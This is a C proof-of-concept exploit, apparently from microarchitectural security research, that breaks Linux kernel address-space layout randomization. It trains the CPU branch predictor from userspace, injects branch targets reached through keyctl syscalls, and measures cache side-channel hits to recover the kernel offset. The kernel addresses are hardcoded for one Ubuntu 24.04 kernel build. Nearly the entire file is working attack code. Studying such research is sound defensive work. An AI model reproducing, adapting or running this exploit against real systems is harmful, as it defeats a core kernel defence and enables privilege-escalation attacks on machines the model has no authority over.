// SPDX-License-Identifier: GPL-3.0-only
/*
 * Break KASLR
 */

#include <err.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <time.h>
#include <linux/keyctl.h>

#include "bp_tools.h"
#include "memtools.h"
#include "branch.h"
#include "stats.h"

#define RB_OFFSET 0xe7
#include "rb_tools.h"

#define SYS_INVALID 0x400
#define NUM_ROUNDS 100
#define NOP_PREFIX_SIZE 0x1000
#define SYS_NR_ATTACK SYS_keyctl

// exploit configuration depending on the kernel version
// Ubuntu 24.04, 6.8.0-47-generic
u64 kernel_bti_call_addr = 0xffffffff816cd179ul; // __keyctl_read_key but inlined in keyctl_read_key
u64 kernel_rdx_call_addr = 0xffffffff8100bca3ul; // victim call in x86_pmu_prepare_cpu
u64 kernel_rax_call_addr = 0xffffffff8100bcf5ul; // victim call in x86_pmu_dead_cpu

typedef struct registers
{
    u64 src_ptr;     // code snip that contains the jump instruction
    u64 dst_ptr_ptr; // jump target

    u64 memory_ptr;
} registers_t;

typedef struct exp_params
{
    u64 victim_call_addr;
    u64 victim_sys_jmp_addr;
} exp_params_t;

typedef struct run_params
{
    exp_params_t *exp_params;
    registers_t *train_sys;
    registers_t *train;
    registers_t *check;
} run_params_t;

typedef struct exp_res
{
    u64 hits_btb;
} exp_res_t;

// clang-format off
extern unsigned char train_src_call_label[];
mk_snip(train_src_call,
    // space for randomized history
    ".rept " STR(NOP_PREFIX_SIZE)"\n"
    "nop\n"
    ".endr\n"
    "train_src_call_label:\n"
    "call *(%rbx)\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(victim_gadget,
    // leak gadget
    "add $"STR(RB_OFFSET)", %rcx\n"
    "mov (%rcx), %rcx\n"
    // skip the ret after the training call 
    "popq %r11\n"
    "ret\n"
    "int3           \n"
);
// clang-format on

// clang-format off
mk_snip(train_dst,
    "ret\n"
    "int3       \n"
);
// clang-format on

// clang-format off
mk_snip(train_sys_dst,
    // trigger BPI
    "syscall\n"
    "ret\n"
    "int3       \n"
);
// clang-format on

void run_exp_once(run_params_t *params)
{
    rb_reset();
    registers_t *train = params->train;
    registers_t *check = params->check;
    registers_t *train_sys = params->train_sys;

    // inject the target to the kernel
    // clang-format off
    asm volatile(""
                    "lea 1f(%%rip), %%r11\n"
                    "pushq %%r11\n"
                    "jmp *%0\n"
                    "1:\n"
                    :
                    : "r"(train_sys->src_ptr), "b"(train_sys->dst_ptr_ptr), "a"(SYS_INVALID)
                    : "rcx", "r11", "memory");
    // clang-format on

    // train a userspace branch
    // clang-format off
    asm volatile(""
        "call *%0\n"
        :
        : "r"(train->src_ptr), "b"(train->dst_ptr_ptr), "c"(train->memory_ptr)
        : );
    // clang-format on

    // use the kernel injected branch target
    volatile register unsigned long r10 asm("r10") = 1;
    asm volatile(
        "syscall\n"
        :
        : "a"(SYS_NR_ATTACK), "D"(KEYCTL_READ), "S"(KEY_SPEC_SESSION_KEYRING), "d"(1), "r"(r10)
        : "rcx", "r11", "memory");

    // check for eviction of our userspace branch (by a branch at kernel injected branch target)
    rb_flush();
    // clang-format off
    asm volatile(""
        "call *%0\n"
        :
        : "r"(check->src_ptr), "b"(check->dst_ptr_ptr), "c"(check->memory_ptr)
        :);
    // clang-format on
    rb_reload();
}

const u64 dummy_memory;
void run_exp(run_params_t *params, exp_res_t *exp_res)
{
    // build the set of code snippets in advance
    int secret = SECRET;

    registers_t train_sys;
    registers_t train;
    registers_t check;

    // reset randomized histories
    clear_jmps(params->train->src_ptr, NOP_PREFIX_SIZE);
    clear_jmps(params->check->src_ptr, NOP_PREFIX_SIZE);

    // no randomization needed to inject kernel target
    train_sys.src_ptr = bhb_rand_nearjmp(params->train_sys->src_ptr, NOP_PREFIX_SIZE, 0);
    train_sys.dst_ptr_ptr = params->train_sys->dst_ptr_ptr;
    train_sys.memory_ptr = 0;

    // rerandomize history for our self-attack
    train.src_ptr = bhb_rand_nearjmp(params->train->src_ptr, NOP_PREFIX_SIZE, 4);
    train.dst_ptr_ptr = params->train->dst_ptr_ptr;
    train.memory_ptr = _ul(&dummy_memory) - RB_OFFSET;

    // rerandomize history
    check.src_ptr = bhb_rand_nearjmp(params->check->src_ptr, NOP_PREFIX_SIZE, 4);
    check.dst_ptr_ptr = params->check->dst_ptr_ptr;
    check.memory_ptr = RB_PTR + secret * RB_STRIDE;

    run_params_t run_params = {
        .exp_params = params->exp_params,
        .train_sys = &train_sys,
        .train = &train,
        .check = &check,
    };
    run_exp_once(&run_params);

    exp_res->hits_btb = rb_hist[secret];
}

u64 results_btb[NUM_ROUNDS] = {0};
u64 evaluate_experiment(exp_params_t *params)
{
    code_snip_t train_sys_src_snip;
    code_snip_t train_sys_dst_snip;
    code_snip_t train_src_snip;
    code_snip_t train_dst_snip;
    code_snip_t check_dst_snip;

    u64 victim_jmp_addr = params->victim_call_addr;
    u64 victim_sys_jmp_addr = params->victim_sys_jmp_addr;

    // create training addrs
    u64 train_sys_jmp_addr;
    u64 train_sys_src_addr;
    do
    {
        train_sys_jmp_addr = (victim_sys_jmp_addr & 0xFFFFFFul) | (rand47() & 0x6FFFFF000000ul) | 0x400000000000ul;
        train_sys_src_addr = train_sys_jmp_addr - (_ul(train_src_call_label) - _ul(train_src_call__snip));
    } while (init_snip(&train_sys_src_snip, train_sys_src_addr, train_src_call));

    // create a gadget at a random but BTB predictable location
    u64 train_sys_dst_addr;
    do
    {
        train_sys_dst_addr = ((train_sys_jmp_addr & 0x7FFF00000000ul) | ((victim_jmp_addr) & 0xFFFFFFFFul));
    } while (init_snip(&train_sys_dst_snip, train_sys_dst_addr, train_sys_dst));

    u64 train_jmp_addr;
    u64 train_src_addr;
    do
    {
        train_jmp_addr = (victim_jmp_addr & 0xFFFFFFul) | (rand47() & 0x6FFFFF000000ul) | 0x400000000000ul;
        train_src_addr = train_jmp_addr - (_ul(train_src_call_label) - _ul(train_src_call__snip));
    } while (init_snip(&train_src_snip, train_src_addr, train_src_call));

    // create a gadget at a random but BTB predictable location
    u64 train_dst_addr;
    do
    {
        train_dst_addr = ((train_jmp_addr & 0x7FFF00000000ul) | (rand47() & 0xFFFFFFFFul));
    } while (init_snip(&train_dst_snip, train_dst_addr, victim_gadget));

    // create a harmless destination at a random but BTB predictable location
    u64 check_dst_addr;
    do
    {
        check_dst_addr = ((train_jmp_addr & 0x7FFF00000000ul) | (rand47() & 0xFFFFFFFFul));
    } while (init_snip(&check_dst_snip, check_dst_addr, train_dst));

    registers_t train_sys;
    registers_t train;
    registers_t check;

    train_sys.src_ptr = train_sys_src_addr;
    train_sys.dst_ptr_ptr = _ul(&train_sys_dst_snip.ptr_u64);

    train.src_ptr = train_src_addr;
    train.dst_ptr_ptr = _ul(&train_dst_snip.ptr_u64);

    check.src_ptr = train_src_addr;
    check.dst_ptr_ptr = _ul(&check_dst_snip.ptr_u64); // set the target to wherever

    u64 sum = 0;
    for (int r = 0; r < NUM_ROUNDS; ++r)
    {
        // this performs an IBPB and makes our measurements more reliable by resetting the branch predictor
        prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0);
        exp_res_t exp_res;

        run_params_t run_params = {
            .exp_params = params,
            .train_sys = &train_sys,
            .train = &train,
            .check = &check,
        };

        run_exp(&run_params, &exp_res);

        sum += (exp_res.hits_btb > 0) ? 1 : 0;
    }

    junmap(&train_sys_src_snip);
    junmap(&train_sys_dst_snip);
    junmap(&train_src_snip);
    junmap(&train_dst_snip);
    junmap(&check_dst_snip);

    return sum;
}

int main(int argc, char *argv[])
{
    srandom(getpid());

    rb_init();

    INFO("### Breaking KASLR ###\n");

    INFO("breaking lower bits\n");
    clock_t kaslr_start = clock();
    u64 lower_bits = -1;
    for (u64 i = 0; i < 8; ++i)
    {
        exp_params_t params_call = {
            .victim_call_addr = kernel_bti_call_addr + (i << 21),
        };
        u64 sum = evaluate_experiment(&params_call);
        if (sum < NUM_ROUNDS / 10)
        {
            lower_bits = i;
        }
    }
    INFO("lower bits: 0x%lx\n", lower_bits);

    u64 higher_bits = -1;
    u64 victim_bti_call_addr = kernel_bti_call_addr + (lower_bits << 21);
    // INFO("victim_sys_jmp_addr: 0x%lx\n", victim_bti_call_addr);
    while (higher_bits == -1)
    {
        INFO("breaking higher bits\n");
        for (u64 i = 0; i < 64; ++i)
        {
            exp_params_t params_call = {
                .victim_call_addr = kernel_rdx_call_addr + (lower_bits << 21) + (i << 24),
                .victim_sys_jmp_addr = victim_bti_call_addr,
            };
            u64 sum = evaluate_experiment(&params_call);
            if (sum < NUM_ROUNDS / 2)
            {
                INFO("candidate: 0x%lx\n", i);
                // verify whether this is the correct one using a second check to reduce false positives
                params_call.victim_call_addr = kernel_rax_call_addr + (lower_bits << 21) + (i << 24);
                sum = evaluate_experiment(&params_call);
                if (sum < NUM_ROUNDS / 2)
                {
                    higher_bits = i;
                    break;
                }
            }
        }
    }

    clock_t kaslr_end = clock();
    INFO("higher bits: 0x%02lx\n", higher_bits);
    INFO("kaslr time: %fs\n", ((double)(kaslr_end - kaslr_start)) / CLOCKS_PER_SEC);

    INFO("KASLR offset: 0x%02lx\n", (higher_bits << 24) + (lower_bits << 21));
}
